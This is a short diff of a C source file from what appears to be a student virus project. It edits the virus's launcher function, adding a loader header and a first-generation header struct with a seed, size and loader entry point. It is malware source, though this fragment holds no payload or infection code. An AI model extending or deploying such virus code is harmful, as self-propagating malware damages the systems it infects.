@@ -6,12 +6,13 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
-/*   Updated: 2020/06/20 14:52:36 by ichkamo          ###   ########.fr       */
+/*   Updated: 2021/06/15 16:54:04 by ichkamo          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "syscall.h"
 #include "virus.h"
+#include "loader.h"
 
 /*
 ** _start is the launcher function of the virus
@@ -21,7 +22,15 @@
 
 void	_start(void)
 {
-	virus();
+	/* 1st generation values */
+	struct virus_header	vhdr = {
+		// .seed         = 0xfadedbade1f5eed5,
+		.seed         = 0x5555555555555555,
+		.virus_size   = _start - loader_entry,
+		.loader_entry = loader_entry,
+	};
+
+	virus(&vhdr);
 
 	sys_exit(0);
 	__builtin_unreachable();
